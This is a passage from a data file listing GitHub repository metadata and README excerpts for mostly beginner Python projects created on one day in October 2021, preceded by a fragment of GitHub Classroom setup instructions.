assignment in github classroom (everytime you )  Select your classroom in the github classroom interface Click the green ""New assignment"" button. Set a title and deadline. Choose an individual or group/team assignment Leave the repository as private: that way only you and the group/team members can see the student's repository Add your repository (starter code) as template repository. Do not add autograding tests with the interface (they are already on your repo) A link to distribute the assignment will be created. When students accept the assignment through the link a repository will be created in the organization  "
417504422;Python-password-generator;https://github.com/isaccanedo/Python-password-generator;Python;2021-10-15T13:12:01Z;0;0;0;Python-password-generator 🔑 O gerador de senha permite que você gere uma senha aleatória de comprimento N 
417505535;datascience_portefolio_python;https://github.com/kalidou39/datascience_portefolio_python;;2021-10-15T13:15:28Z;0;0;0;
417444994;python_practica4;https://github.com/balskij-ds-politech/python_practica4;;2021-10-15T09:36:44Z;0;0;0;python_practica4 
417479769;100-days-of-python;https://github.com/Chiboy042/100-days-of-python;;2021-10-15T11:46:01Z;0;0;0;100-days-of-python chapter 1 phython bases chapet 2 follow control `chapter 3 fungus chapter 4 list chapter 5 dictionary chapter 6 manipulating strange chapter 7 pattern matching chapter 8 reading amd files chpater 9 organizing files chapter 10 debgging chapter 11 web scrapping chapter 12 working with excrl spreedsheet chapter 13 working with pdf and word docmeftd capter 14 working with css files and Jsm 
417463706;Innomatics-Python-Tasks;https://github.com/ShubhamShindee/Innomatics-Python-Tasks;Jupyter Notebook;2021-10-15T10:46:20Z;0;0;0;
417465610;python-hangman-game;https://github.com/DiogoC7/python-hangman-game;Python;2021-10-15T10:53:56Z;0;0;0;
417518203;scraping_with_python;https://github.com/zufanka/scraping_with_python;Jupyter Notebook;2021-10-15T13:56:00Z;0;0;0;Scraping with Python  Homework  Write these scrapers again Do the scraping from datajournalism.com Look for other scraping with Python and BeautifulSoup tutorials (for example this one goes quite deeply into scraping) Scrape. It can be whatever, just make sure it’s a website that is frequently visited. For example: scrape all the links to the weird preparations of fish in Scandinavian countries from the “See also” section of wikipedia's entry for Hákarl  If it's too much Try these plugins for chrome:  Webscraper: can scrape multiple pages Scraper: handy for scraping simple table on just one site    get the presentation  
417529385;awesome-python-tutorial;https://github.com/SFUMECJF/awesome-python-tutorial;Jupyter Notebook;2021-10-15T14:28:57Z;1;1;0;awesome-python-tutorial 
417435077;Face-Detection-with-Python;https://github.com/viral-since-2001/Face-Detection-with-Python;;2021-10-15T09:02:06Z;0;0;0;
417446681;python-django-web-app;https://github.com/HashmitesCodz/python-django-web-app;;2021-10-15T09:42:32Z;0;0;0;
417444424;Python-game1;https://github.com/Leebob1/Python-game1;;2021-10-15T09:34:49Z;0;0;0;Python-game1 
417431860;week4-python;https://github.com/L00163425/week4-python;Python;2021-10-15T08:51:52Z;0;0;0;
417466485;python_labo04_iot;https://github.com/MichielVSan/python_labo04_iot;;2021-10-15T10:57:12Z;0;0;0;python_labo04_iot 
417470003;Python-DaftarKontak;https://github.com/RimuraZen/Python-DaftarKontak;;2021-10-15T11:09:35Z;0;0;0;
417501903;python-github-action;https://github.com/rjshk013/python-github-action;Python;2021-10-15T13:03:36Z;0;0;0;
417521796;Python-Brasil-Validacao;https://github.com/silviosnjr/Python-Brasil-Validacao;Python;2021-10-15T14:06:19Z;0;0;0;
417494046;Python_problem_solutions;https://github.com/kunalashoklohar/Python_problem_solutions;Python;2021-10-15T12:37:11Z;0;0;1;
417476065;python-coding-examples;https://github.com/Valencia-Dias/python-coding-examples;Python;2021-10-15T11:32:09Z;0;0;0;
417556023;PYTHON_HIT_2021;https://github.com/DungLeTien2002/PYTHON_HIT_2021;;2021-10-15T15:52:07Z;0;0;0;PYTHON_HIT_2021 
417523439;python-projet-2;https://github.com/novaedra/python-projet-2;Python;2021-10-15T14:11:01Z;0;0;0;python-projet-2 
417547057;Smile-Detector-using-Python;https://github.com/balajisrinivas/Smile-Detector-using-Python;Python;2021-10-15T15:22:51Z;1;1;0;
417438735;python-music_player;https://github.com/controlground/python-music_player;Python;2021-10-15T09:14:51Z;0;0;0;
417498755;Python_Course_Docs;https://github.com/VManzi/Python_Course_Docs;;2021-10-15T12:53:26Z;0;0;0;
417434465;Text-Game-Python;https://github.com/Navereni/Text-Game-Python;Python;2021-10-15T09:00:25Z;0;0;0;Text-Game-Python My first little text game done in Python. Work is still in progress. 
417556925;python_pro_m7;https://github.com/GBatisaldo/python_pro_m7;Python;2021-10-15T15:55:10Z;0;0;0;python_pro_m7 
417555047;mstr_python_api;https://github.com/arcann/mstr_python_api;Python;2021-10-15T15:48:53Z;0;0;0;MicroStrategy Python API (microstrategy-api)   Python API library for interacting with MicroStrategy Intelligence Server and/or MicroStrategy Web Server. This library is not endorsed by, directly affiliated with, maintained, authorized, or sponsored by MicroStragy Incorporated. Supported MicroStrategy sub-APIs  TaskProc API COM API REST API (Work in progress)  Installation Install using pip install -U microstrategy-api or conda install microstrategy-api -c conda-forge. Examples See examples folder 
417509414;python-simple-tools;https://github.com/Symthy/python-simple-tools;Python;2021-10-15T13:28:06Z;0;0;0;Python Simple Tools Unfinished tools. Finished tool will separates repository. 
417499653;Numerical-analysis-python;https://github.com/NeriyaZudi/Numerical-analysis-python;Python;2021-10-15T12:56:30Z;0;0;0;Numerical-analysis-python 
417543844;My-Python-Projects;https://github.com/Pranav-kat/My-Python-Projects;Python;2021-10-15T15:13:24Z;0;0;0;
417557205;mastering-object-oriented-python;https://github.com/rodrigobmedeiros/mastering-object-oriented-python;;2021-10-15T15:56:06Z;0;0;0;
417488595;About_LearningPython;https://github.com/BlueWhale-S101/About_LearningPython;;2021-10-15T12:17:44Z;0;0;0;I will put my datas for my study Python. 
417424818;first_python_project;https://github.com/Alon-banin/first_python_project;Python;2021-10-15T08:28:38Z;0;0;0;
417421451;Python-Final-Course;https://github.com/Valiyevab/Python-Final-Course;Python;2021-10-15T08:17:02Z;0;0;0;Python-Final-Course Editing the file Its a markdown file in a repository. 
417549929;Some-Python-Code;https://github.com/PierpaoloPisapia78/Some-Python-Code;;2021-10-15T15:31:57Z;0;0;0;
417552344;DsAndAlgoPython;https://github.com/bala93kumar/DsAndAlgoPython;Python;2021-10-15T15:40:18Z;0;0;0;
417515230;E2.Python;https://github.com/hmuehlhausen/E2.Python;;2021-10-15T13:46:45Z;0;0;0;
417480259;book-async-python;https://github.com/amamov/book-async-python;;2021-10-15T11:47:46Z;0;0;0;book-async-python 도서 『파이썬 동시성/병렬성 프로그래밍』 (BjPublic Korea, 2022) 코드 
417530464;python-set-operation;https://github.com/Debayan97531/python-set-operation;;2021-10-15T14:32:22Z;0;0;0;
417417059;python-random-quote;https://github.com/Francewalk/python-random-quote;Python;2021-10-15T08:02:37Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417558600;TASK1_PYTHON_INNOMATICS;https://github.com/mrcomet/TASK1_PYTHON_INNOMATICS;;2021-10-15T16:00:47Z;0;0;0;TASK1_PYTHON_INNOMATICS THE FOLDER CONTAINS ALL THE FILE OF TASK 1 OF INNOMATICS 
417554733;python-random-quote;https://github.com/rider177/python-random-quote;Python;2021-10-15T15:47:47Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417438045;Python_Small_Scripts;https://github.com/AlyaF3i/Python_Small_Scripts;TeX;2021-10-15T09:12:17Z;0;0;0;
417518358;Opensea-Bidding-Bot-Python;https://github.com/zakirhossen23/Opensea-Bidding-Bot-Python;Python;2021-10-15T13:56:27Z;0;0;1;
417531200;python-so-far;https://github.com/kelani34/python-so-far;Python;2021-10-15T14:34:32Z;0;0;0;
417419926;research_track_python;https://github.com/praingeard/research_track_python;Python;2021-10-15T08:11:45Z;0;0;0;research_track_python 
417436096;FaceDetection-with-Python;https://github.com/viral-since-2001/FaceDetection-with-Python;;2021-10-15T09:05:37Z;0;0;0;
417470784;EDA-ON-PYTHON;https://github.com/MaddiSravya/EDA-ON-PYTHON;;2021-10-15T11:12:28Z;0;0;0;
417492902;MCA-python-programming;https://github.com/Sanchitgupta910/MCA-python-programming;Python;2021-10-15T12:32:55Z;0;0;0;
417494062;python_code_challenges;https://github.com/vonds/python_code_challenges;Python;2021-10-15T12:37:14Z;0;0;0;python_code_challenges 
417465755;video_analtics;https://github.com/MehdiChellak/video_analtics;Python;2021-10-15T10:54:30Z;0;0;0;video_analtics python project 
417422827;sk-cloudz-scheduler;https://github.com/Bongbaegeun/sk-cloudz-scheduler;Python;2021-10-15T08:22:05Z;0;0;0;sk-cloudz-scheduler python scripts 
417528205;math_basics;https://github.com/RAGprog/math_basics;Jupyter Notebook;2021-10-15T14:25:19Z;0;0;0;math_basics with_python 
417429360;PEB802;https://github.com/DelanoJeremy/PEB802;;2021-10-15T08:43:37Z;0;0;0;PEB802 Python Programing 
417444718;An_game_made_by_python;https://github.com/ChenWuwei404/An_game_made_by_python;;2021-10-15T09:35:43Z;0;0;0;乱斗三国 - python game 
417497759;Python_Course_day3_AM;https://github.com/VManzi/Python_Course_day3_AM;Python;2021-10-15T12:50:02Z;0;0;0;
417519029;cfs2160-2021-python-public;https://github.com/steve-mcguire/cfs2160-2021-python-public;;2021-10-15T13:58:28Z;0;0;0;
417544731;automate-the-boring-stuff-python;https://github.com/eitah/automate-the-boring-stuff-python;Python;2021-10-15T15:15:46Z;0;0;0;automate-the-boring-stuff-python 
417424842;Python_forBigDataPR;https://github.com/jungdahae1225/Python_forBigDataPR;;2021-10-15T08:28:42Z;0;0;0;
417509003;Python-Random-Forest-Titanic-Survivorship;https://github.com/aaronmkwong/Python-Random-Forest-Titanic-Survivorship;Jupyter Notebook;2021-10-15T13:26:37Z;0;0;0;Python-Random-Forest-Titanic-Survivorship REPOSITORY UNDER CONSTRUCTION This project uses Random Forest to classify a passenger's survivorship as died or survived. It uses the same engineered data and features as the  Logistic Regression Titanic Survivorship project. The custom function rf_mod_assess() returns a dataframe of all of the classifcation report results for each of the 25 trials using Monte Carlo cross validation. See also the KNN Titanic Survivorship project. The code can be viewed here: Titanic_Survivorship_Random_Forest_02.ipynb. Random Forest outperformed Logistic Regression and KNN by 2% and 1% respectively.  Random Forests samples the training dataset with replacement (bagging), but trees are constructed in a way that reduces the correlation between individual classifiers (Brownlee, 2021, p.93) providing an improvement over Bagged Trees. Bagging (or Bootstrap Aggregation) takes multiple samples from the training dataset with replacement and trains a model for each sample, then averages the predictions of all sub-models to obtain a final averaged prediction (Brownlee, 2021, p. 92). ...  ...  REFERENCES Brownlee, Jason. (2021). Machine Learning Mastery with Python: Understand Your Data, Create Accurate Models and Work Projects End-To-End (v1.2 ed.). https://machinelearningmastery.com/machine-learning-with-python/ James, Gareth, et al. (2017). An Introduction to Statistical Learning (1st ed.). New York: Springer. 
417448913;Python-Projects-Create-A-PDF;https://github.com/natnew/Python-Projects-Create-A-PDF;Jupyter Notebook;2021-10-15T09:50:48Z;0;0;0;Python Projects: Create A PDF 🐍  
417545613;lusid-configuration-sdk-python-preview;https://github.com/finbourne/lusid-configuration-sdk-python-preview;Python;2021-10-15T15:18:17Z;0;0;0;"LUSID® Configuration Python Preview SDK This is the Python Preview SDK for the Configuration API for LUSID by FINBOURNE, a bi-temporal investment management data platform with portfolio accounting capabilities. To use it you'll need a LUSID account. Sign up for free at lusid.com  Installation The PyPi package for the LUSID Configuration SDK can installed using the following: pip install lusid-configuration-sdk-preview finbourne-sdk-utilities  Usage import lusid_configuration from fbnsdkutilities import ApiClientFactory  scheduler_factory = ApiClientFactory(lusid_configuration, api_secrets_filename=""/path/to/secrets.json"") sets_api = scheduler_factory.build(lusid_configuration.api.ConfigurationSetsApi)  sets_api.list_configuration_sets()  "
417522620;Python_DataStructure_and_Algorithm;https://github.com/longmen2019/Python_DataStructure_and_Algorithm;Python;2021-10-15T14:08:34Z;0;0;0;
417519106;lusid-scheduler-sdk-python-preview;https://github.com/finbourne/lusid-scheduler-sdk-python-preview;Python;2021-10-15T13:58:43Z;0;0;0;"LUSID® Scheduler Python Preview SDK This is the Python Preview SDK for the Scheduler API for LUSID by FINBOURNE, a bi-temporal investment management data platform with portfolio accounting capabilities. To use it you'll need a LUSID account. Sign up for free at lusid.com  Installation The PyPi package for the LUSID Scheduler SDK can installed using the following: pip install lusid-scheduler-sdk-preview finbourne-sdk-utilities  Usage import lusid_scheduler from fbnsdkutilities import ApiClientFactory  scheduler_factory = ApiClientFactory(lusid_scheduler, api_secrets_filename=""/path/to/secrets.json"") jobs_api = scheduler_factory.build(lusid_scheduler.api.JobsApi)  jobs_api.list_jobs()  "
417496902;Python_course_day2_AM;https://github.com/VManzi/Python_course_day2_AM;Python;2021-10-15T12:46:59Z;0;0;0;
417498149;Python_Course_day3_PM;https://github.com/VManzi/Python_Course_day3_PM;Python;2021-10-15T12:51:23Z;0;0;0;
417496495;Python_course_day1_PM;https://github.com/VManzi/Python_course_day1_PM;Python;2021-10-15T12:45:40Z;0;0;0;
417477421;minimal-python-project-portable-pytest;https://github.com/mloning/minimal-python-project-portable-pytest;Python;2021-10-15T11:37:21Z;0;0;0;
417454628;FlaskPython_HealthRecord_Backend;https://github.com/AletteXin/FlaskPython_HealthRecord_Backend;Python;2021-10-15T10:11:19Z;0;0;0;
417515400;Python-WiFi-DoS;https://github.com/khoile1806/Python-WiFi-DoS;Python;2021-10-15T13:47:15Z;0;0;0;
417494454;Python---Leap-year-or-not-;https://github.com/JavaHalla/Python---Leap-year-or-not-;Python;2021-10-15T12:38:32Z;0;0;0;Debug Leap Year Instructions  Read this the code in main.py Spot the problems 🐞. Modify the code to fix the program. No shortcuts - don't copy-paste to replace the code entirely with a working solution.  Fix the code so that it works and when you hit submit it should pass all the tests. Solution https://repl.it/@appbrewery/day-13-2-solution 
417472257;BC_HWK_Python_ReSub;https://github.com/SteveMoss96/BC_HWK_Python_ReSub;Python;2021-10-15T11:17:47Z;0;0;0;BC_HWK_Python_ReSub Re-submitting Python Homework 
417495915;CYUT_IM_Graduation-Threshold_Python;https://github.com/p05655123/CYUT_IM_Graduation-Threshold_Python;;2021-10-15T12:43:44Z;0;0;0;CYUT_IM_Graduation-Threshold_Python 朝陽科技大學資管系畢業門檻 擔任家教時所編寫之程式，僅供參考。 
417464419;LAB1_CENTRE_Python-Intro;https://github.com/ismailostmar/LAB1_CENTRE_Python-Intro;Jupyter Notebook;2021-10-15T10:49:18Z;0;0;0;
417497256;Python_Course_day2_PM;https://github.com/VManzi/Python_Course_day2_PM;Python;2021-10-15T12:48:15Z;0;0;0;
417544194;python-sample-vscode-flask-tutorial;https://github.com/milton-chang/python-sample-vscode-flask-tutorial;HTML;2021-10-15T15:14:24Z;0;0;0;"Python/Flask Tutorial for Visual Studio Code   This sample contains the completed program from the tutorial, make sure to visit the link: Using Flask in Visual Studio Code. Intermediate steps are not included.   It also contains the Dockerfile and uwsgi.ini files necessary to build a container with a production server. The resulting image works both locally and when deployed to Azure App Service. See Deploy Python using Docker containers.   To run the app locally:  Run the command cd hello_app, to change into the folder that contains the Flask app. Run the command set FLASK_APP=webapp (Windows cmd) or FLASK_APP=webapp (macOS/Linux) to point to the app module. Start the Flask server with flask run.    The startup.py file In the root folder, the startup.py file is specifically for deploying to Azure App Service on Linux without using a containerized version of the app (that is, deploying the code directly, not as a container). Because the app code is in its own module in the hello_app folder (which has an __init__.py), trying to start the Gunicorn server within App Service on Linux produces an ""Attempted relative import in non-package"" error. The startup.py file, therefore, is a shim to import the app object from the hello_app module, which then allows you to use startup:app in the Gunicorn command line (see startup.txt). Contributing Contributions to the sample are welcome. When submitting changes, also consider submitting matching changes to the tutorial, the source file for which is tutorial-flask.md. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit https://cla.microsoft.com. When you submit a pull request, a CLA-bot automatically determines whether you need to provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA. Additional details  This project has adopted the Microsoft Open Source Code of Conduct. For more information see the Code of Conduct FAQ or Contact opencode@microsoft.com with any additional questions or comments.  "
417493746;Python---Average-heights-of-students;https://github.com/JavaHalla/Python---Average-heights-of-students;Python;2021-10-15T12:36:05Z;0;0;0;
417540791;Encode-And-Decode-Python-Script;https://github.com/HajEndBoy/Encode-And-Decode-Python-Script;Python;2021-10-15T15:03:34Z;0;0;0;
417547374;custom_path;https://github.com/annedanilenko/custom_path;Jupyter Notebook;2021-10-15T15:23:47Z;0;0;0;Personal projects Четыре самостоятельных проекта анализа с помощью Python  Анализ пользовательского пути для моб. приложения Кластерный анализ машин с помощью KMeans (на английском) Анализ ботов через Яндекс.Метрики Анализ пользователей также для моб. приложения  
417555625;pyamiimage;https://github.com/petermr/pyamiimage;Python;2021-10-15T15:50:52Z;0;0;0;pyamiimage Image analysis in Python See also the Java tools in https://github.com/ContentMine/imageanalysis . This is not a fork, but completely rewritten Code is copied from https://github.com/petermr/opendiagram , mainly from https://github.com/petermr/openDiagram/tree/master/physchem/python/image Test-Driven Documentation on Wiki Demos on ipynb Notebooks 
417524926;introPy;https://github.com/RodrigoSantos1208/introPy;Python;2021-10-15T14:15:23Z;0;0;0;
417443300;Note;https://github.com/Yinhe21/Note;;2021-10-15T09:30:45Z;0;0;0;Note Python 笔记 
417480276;Clustering;https://github.com/thor123-tanuj/Clustering;Python;2021-10-15T11:47:49Z;0;0;0;Clustering A simple python program 
417535969;Carly-Clippers;https://github.com/Boateng24/Carly-Clippers;Python;2021-10-15T14:48:53Z;0;0;0;Carly-Clippers Codecademy python Loops project 
417467778;hello-world;https://github.com/HK-2021/hello-world;;2021-10-15T11:01:24Z;0;0;0;hello-world learn Python from scratch 
417479338;DataAnalysis_Lobsterland;https://github.com/Ng-ethe/DataAnalysis_Lobsterland;Jupyter Notebook;2021-10-15T11:44:25Z;0;0;0;
417483353;basic-works;https://github.com/busracncn/basic-works;Jupyter Notebook;2021-10-15T11:59:14Z;0;0;0;chill-working Python basic working 
417485313;Ramsoware;https://github.com/yagmurislim/Ramsoware;;2021-10-15T12:05:59Z;0;0;0;
417550208;npower;https://github.com/gchave77/npower;Python;2021-10-15T15:32:50Z;0;0;0;npower npower google python course updating file 
417496262;currency-converter;https://github.com/SHAYON2003/currency-converter;Python;2021-10-15T12:44:57Z;0;0;0;
417541342;flaskr;https://github.com/Korbisch/flaskr;Python;2021-10-15T15:05:20Z;0;0;0;
417445646;online-license-code;https://github.com/FelixF0/online-license-code;Python;2021-10-15T09:38:55Z;1;1;0;online-license-code Coded with python code How to run  install python at https://www.python.org/downloads/windows/ python simple-license.py  Jangan lupa star & fork 
417443346;alar-project;https://github.com/pathideva22/alar-project;Python;2021-10-15T09:30:55Z;0;0;0;alar-project alarm project in python 
417542628;simple-dali;https://github.com/crotwell/simple-dali;;2021-10-15T15:09:28Z;0;0;0;simple-dali Datalink in pure python. 
417538907;Summarizer;https://github.com/Arvind-4/Summarizer;HTML;2021-10-15T14:57:57Z;0;0;0;Summarizer Summarize your Content on  summarizer-flask Here's a list of the packages we will use to accomplish this:  Flask HTML5 Tailwind CSS Gunicorn javascript and more .  Code Install Virtualenv pip install virtualenv cd /path/to/folder mkdir summarizer cd summarizer python -m venv .  Activate the Virtualenv source scripts/activate  Install Dependencies cd /path/to/folder/summarizer git clone https://github.com/Arvind-4/Summarizer.git . pip install -r requirements.txt  Run the Code cd /path/to/folder/chatapp/src ./run.sh  
417558570;aeon;https://github.com/xeenypl/aeon;Python;2021-10-15T16:00:42Z;1;1;0;Aeon JVM written in python. Project because multiple projects use java or python. Thous language are always easy to use and read, and most importantly extremal fast. I try to combined both world and crate even better experience user and most importantly for developer. 
417558068;ICS3U-Unit5-04-Python;https://github.com/Michael-Zagon/ICS3U-Unit5-04-Python;Python;2021-10-15T15:58:56Z;0;0;0;ICS3U-Unit5-04-Python  
417439272;Prueba-T-cnica-Backend-Python---ZINOBE;https://github.com/daustariz18/Prueba-T-cnica-Backend-Python---ZINOBE;;2021-10-15T09:16:37Z;0;0;0;Prueba-T-cnica-Backend-Python---ZINOBE Prueba Tecnica Backend Python Empresa Zinobe  
417469823;Graphical-Exploratory-Data-Analysis-Using-python;https://github.com/2015n3192/Graphical-Exploratory-Data-Analysis-Using-python;;2021-10-15T11:08:54Z;0;0;0;Graphical-Exploratory-Data-Analysis-Using-python This Repository is mainly about the activities and code used to do EDA using python 
417484686;211015---BAEKJUN-4-1-with-Python;https://github.com/Readrive/211015---BAEKJUN-4-1-with-Python;Python;2021-10-15T12:03:54Z;0;0;0;
417461532;GCSE_To_A_Level_with_Python;https://github.com/Inksaver/GCSE_To_A_Level_with_Python;Python;2021-10-15T10:37:35Z;0;0;0;GCSE To A Level with Python Some thoughts for GCSE CS students moving to A Level (UK) Python seems to be the language of choice for most UK secondary schools, especially at GCSE level. This is often continued into A level as students already have a good knowledge of Python. As the exams are biased to roughly 20% code to 80% theory, the time spent learning code is limited, and as a result the code produced by most students could be improved. This repo is a source of ideas from a C# programmer's experience to improve code typically seen at GCSE to a standard more suitable for A level. Some lua code is used initially for examples which is taken from the resource at https://github.com/Inksaver/LuaForSchools 
417488183;Python-Tutorial-File-Handling-Using-OOP;https://github.com/parvej35/Python-Tutorial-File-Handling-Using-OOP;Python;2021-10-15T12:16:13Z;0;0;0;Python: Read Write in File Using OOP Concept This is a basic Python learning project. In this project we will learn how to collect data from user input and save this into a file using python OOP concept. Also, we will see how to view and delete a particular data. Cloning the Project from Repo git clone https://github.com/parvej35/Python-Tutorial-File-Handling-Using-OOP.git Git should be installed on your system. Alternatively, you can download the zip-file or download the individual notebooks. Author Parvej Ahmed Chowdhury parvej35@gmail.com +31 6 22 512 526 
417431755;Final_Assignment_Machine_Learning_With_Python;https://github.com/TheCiccio/Final_Assignment_Machine_Learning_With_Python;Jupyter Notebook;2021-10-15T08:51:34Z;0;0;0;Final_Assignment_Machine_Leraning_With_Python My Final Assignment for Coursera's course Machine Learning with Python The project was reviewd by peers on 10/09/2021 and got 25/25 
417481645;Tic-Tac-Toe-Game-with-Python;https://github.com/Abdul-Hafeez-Galib/Tic-Tac-Toe-Game-with-Python;Python;2021-10-15T11:52:50Z;0;0;0;Are you bored? Why not play the Tic-Tac-Toe game with your friend? This is a game I am always interested to play ☺️ 
417460918;python_Flask_Multiseller_Cake_shop_project;https://github.com/AbdullahAlmizan644/python_Flask_Multiseller_Cake_shop_project;CSS;2021-10-15T10:35:15Z;0;0;0;python_Flask_Multiseller_Cake_shop_project python_Flask_Multiseller_Cake_shop_project 
417542003;ICS3U-Unit5-03-Python;https://github.com/Joshua-Yeung-2/ICS3U-Unit5-03-Python;;2021-10-15T15:07:22Z;0;0;0;ICS3U-Unit5-03-Python  
417498972;google_assistant_number_guessing_game_with_python;https://github.com/ShobanChiddarth/google_assistant_number_guessing_game_with_python;Python;2021-10-15T12:54:15Z;0;0;0;Google assistant number Guessing Game with Python A copy of Google Assistant's number guessing game, built with python. Same as Google Assistant, but in python. Yes, it is of course useless. It is just a clone.  main.py It is the actual number guessing game you play with Google assistant. You think of a number, and the script will guess it. reverse.py It is reverse number guessing game. The script will think of a number and you will guess it. 
417553940;Unit5-04-Python-volume_cylinder;https://github.com/crestel-ong/Unit5-04-Python-volume_cylinder;Python;2021-10-15T15:45:11Z;0;0;0;Unit5-04-Python-volume_cylinder  
417448722;simple-python-calculator-with-maya-bello;https://github.com/titonova/simple-python-calculator-with-maya-bello;Python;2021-10-15T09:50:08Z;0;0;0;simple-python-calculator-with-maya-bello 
417543743;batchimage;https://github.com/insumanth/batchimage;Python;2021-10-15T15:13:03Z;1;1;0;batchimage   Batch Image Processing 
417444474;live_love_zombies;https://github.com/dylangorman/live_love_zombies;Python;2021-10-15T09:34:58Z;1;1;0;live_love_zombies Python text based adventure game 
417487521;Discord-Bot;https://github.com/TurtleHelm/Discord-Bot;Python;2021-10-15T12:13:52Z;0;0;0;Discord Bot A Simple Python Discord Bot Requirements  discord.py (pip3 install --upgrade discord.py) pathlib (pip3 install --upgrade pathlib) logging (pip3 install --upgrade logging) asyncio (pip3 install --upgrade asyncio) datetime (pip3 install --upgrade datetime) aiohttp (pip3 install --upgrade aiohttp)  How to Use Download the file or Clone the Repo, Add your Token(s) and run bot.py 
417476740;Stock-class;https://github.com/Ng-ethe/Stock-class;Jupyter Notebook;2021-10-15T11:34:45Z;0;0;0;
417417890;OurHealthApp;https://github.com/Tacos-and-Fries/OurHealthApp;;2021-10-15T08:05:10Z;0;0;0;OurHealthApp Health App designed in python 
417475764;fsspec-rclone;https://github.com/ivandeex/fsspec-rclone;Python;2021-10-15T11:31:01Z;0;0;0;"fsspec-rclone Implementation of fsspec for rclone. A simple example: import fsspec  with fsspec.open(""rclone://sftp:host=localhost,user=myuser,pass=mypass,config=/etc/rclone/rclone.conf:path/to/file"", ""r"") as f:     print(f.read()) TBC "
417525845;CS261F21PID17;https://github.com/zhassan9246/CS261F21PID17;;2021-10-15T14:18:09Z;0;0;0;
417433622;Resolution;https://github.com/takeshijmalau/Resolution;;2021-10-15T08:57:31Z;0;0;0;Resolution Repository untuk list pembelajaran Python 
417496244;ScreenRecorder;https://github.com/marceli10/ScreenRecorder;;2021-10-15T12:44:53Z;0;0;0;ScreenRecorder Screen recorder wrote in python 
417503468;jpjwidgets;https://github.com/gbrault/jpjwidgets;Jupyter Notebook;2021-10-15T13:08:52Z;1;1;0;jpjwidgets Jupyter Python+Javascript Widgets: link javascript variables with Kernel Python variables and vice-versa. jpjwidgets is not a replacement1 for ipywidgets, it is just a complement which fill some gaps and brings some 'innovations'  The most differentiating feature is that jpjwidgets brings a REST API, build by the application designer, embedded in the notebook  With the above feature, its possible to to fill the gap Jupyter Lab had (by design): communicate from javascript browser to the python kernel off-the-shelf This HTTP communciation if completly safe as under the security framework of jupyter lab and using the jupyter server proxy the notebook is at the same time  A Jupyter IPython notebook A REST API (which can also serve some web pages or files if needed)     Please use UI widgets from ipywidgets: jpjwidgets project will not develop that (the range widget is just a POC)  If you want  to copy browser's javascript variables to IPython kernel variable to set some browser's variable based upon IPython kernel variable feed the notebook with pictures from your smartphone live (implementation not provided here)  Examples  get the current calling Notebook url in a python variable get the browser Geo Position (if the user accepts) in a Python variable  Architecture  Javascript is simply generated thanks to the repr_javascript capability of IPython Notebook  this allows to set whatever javascript variable from a notebook programmatically it can also be generated by the HTML function of IPython.display module   Writing back javascript values to the notebook via the HTTP server  this allows to set whatever python IPython kernel variable with javascript Browser values callback can also be implemented to change the state of the notebook when variable are received    Install  Base Framework: Jupyter Lab + Jupyter ipywidgets + Jupyter Server proxy Copy: notebook and python file in a Jupyter Lab directory create the widgets directory in the above Run: The notebooks  Documentation  Read the notebooks notes read the python file comments if you want to dig the HTTP server operations  (1) This clarification was requested by @krassowski see 
417463468;PyC;https://github.com/RodkinIvan/PyC;C++;2021-10-15T10:45:24Z;0;0;0;PyC Setup In the root of the repository: sudo ./setup.h Creating a module Anywhere: create_pyc_module <module_name> $EDITOR <module_name>/<module_name>_src.cpp Then, import your c++ functions or classes and wrap them according to boost::python API or a small the most necessary part in syntax_guide. Then, compile it, using: compile_pyc_module <module_name> This command will create the <module_name>.so file, which acts like real python module Usage In the same folder with <module_name>.so: import <module_name> or from <module_name> import <something_from_the_module>  or anyway you want. Uninstallation sudo ./uninstall.sh 
417516059;ICS3U-Unit5-04-Python-Program;https://github.com/Igor-Zhelezniak-1/ICS3U-Unit5-04-Python-Program;Python;2021-10-15T13:49:22Z;0;0;0;ICS3U-Unit5-04-Python-Program  
417556113;ICS3U-Unit5-04-Python-Volume_of_Cylinder;https://github.com/Rodas-Nega1/ICS3U-Unit5-04-Python-Volume_of_Cylinder;Python;2021-10-15T15:52:24Z;0;0;0;ICS3U-Unit5-04-Python-Volume_of_Cylinder  
417500164;ICS3U-Unit5-03-Python-Levels;https://github.com/sydneykuhn/ICS3U-Unit5-03-Python-Levels;Python;2021-10-15T12:58:13Z;0;0;0;ICS3U-Unit5-03-Python-Levels  
417558118;PortfolioProject3-Movie-data-correlation-in-Python;https://github.com/Tunewhistle/PortfolioProject3-Movie-data-correlation-in-Python;Jupyter Notebook;2021-10-15T15:59:05Z;0;0;0;Movie-data-correlation-in-Python This project aims to find correlation among data fields of this movie industry data using Python, and see what are directly correlated or highly correlated fields with the gross revenue, what factors affect movie revenue to what extent. It was performed in Anaconda (Python IDE) with Jupyter Notebook. The raw dataset was downloaded from https://www.kaggle.com/danielgrijalvas/movies. 
417417420;form;https://github.com/vrmsengineer/form;;2021-10-15T08:03:42Z;0;0;0;form registration and login form using python. 
417487251;scripts;https://github.com/jaswdr/scripts;Shell;2021-10-15T12:12:53Z;0;0;0;scripts ▶️ Bash and Python scripts for various projects 
417553138;Inventory-managment-system;https://github.com/kawael/Inventory-managment-system;;2021-10-15T15:42:50Z;0;0;0;Inventory Management System Using Python Tkinter    Introduction  Inventory managemrnt system is an open source platform for manage business. It has a comprehensive, flexible ecosystem of tools, libraries, and community resources that lets businesses push to manage their system most effectively. This is a software for practice of developing a system from completely scratch. Understanding this will help a lot in system development and basic structure of a system along with GUI with python library Tkinter. This software was originally developed by Amit Kumar Datta Motivation This project is motivated by Web code's inventory managment system. Here his project- Inventory Management System with Database | Complete GUI Python Project. His youtube channel- Web code System Overview  The System consists of two main components -  Admin tab Employee tab  Methodology Dashbord  Dashbord is only available for only Admin. Admin can see full overview of business. Employee  In empolyee tab admin can add, delete and update employee. Supplier  It also available for only Admin. In empolyee tab admin can add, delete and update employee. Category  In Category tab admin can add, 